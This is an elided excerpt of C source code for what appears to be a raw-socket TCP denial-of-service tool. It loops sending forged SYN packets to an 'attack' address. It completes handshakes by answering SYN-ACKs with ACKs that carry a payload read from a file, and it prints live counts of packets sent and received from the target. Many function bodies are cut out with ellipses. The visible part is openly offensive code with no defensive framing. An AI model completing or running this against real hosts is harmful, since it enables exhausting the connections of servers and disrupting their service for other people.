...
void calc_tcp_checksum(unsigned char *packet, unsigned long packet_length,
...
void processArgs(int argc, char **argv)
{
    ...
    *port = '\0';
    ...
    printf("[+] Sending packets from %s (%s)\n", remArgv[iface_index],
           inet_ntoa(globalArgs.iface_addr.sin_addr));
...
void loadPayload(char *path)
{
    ...
    globalArgs.payload_size =
        fread(globalArgs.payload, sizeof(unsigned char), MAX_PAYLOAD_SIZE,
              file);
    if (ferror(file))
        printUsage("Error reading payload file.");
}
...
void *print_status(void *ptr)
{
    ...
    while (1) {
        printf
            ("[+] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\r",
             packetStats.syn_sent, packetStats.ack_sent,
             packetStats.synack_recv, packetStats.ack_recv,
...
void *send_syns(void *ptr)
{
    ...
    if (bind
        (s_out, (struct sockaddr *) &globalArgs.iface_addr,
    ...
    while (1) {
        ...
        calc_tcp_checksum((unsigned char *) &tcp,
                          sizeof(struct tcp_header),
                          globalArgs.iface_addr.sin_addr,
                          attack_addr.sin_addr);

        int ret = sendto(s_out, &tcp, sizeof(struct tcp_header), 0,
                         (struct sockaddr *) &attack_addr,
...
void send_ack(unsigned char *packet)
{
    ...
    struct tcp_header *synack =
        (struct tcp_header *) (packet + 4 * (ip->ver_ihl & 0x0F));
    ...
    if (synack->off_res_flags & htons(0x0010)
        && synack->off_res_flags & htons(0x0002)) {
        ack->ack = htonl(ntohl(synack->seq) + 1);
        ack->seq = synack->ack;
        memcpy(reply + sizeof(struct tcp_header), globalArgs.payload,
               globalArgs.payload_size);
        packet_size += globalArgs.payload_size;
    }

    calc_tcp_checksum(reply, packet_size, globalArgs.iface_addr.sin_addr,
                      attack_addr.sin_addr);
...
void *process_incoming(void *ptr)
{
    ...
    while (1) {
        ...
        struct tcp_header *tcp =
            (struct tcp_header *) (packet_buffer +
                                   4 * (ip->ver_ihl & 0x0F));

        if (ip->source_addr == globalArgs.attack_ip.s_addr
            && ip->protocol == IP_PROT_TCP) {
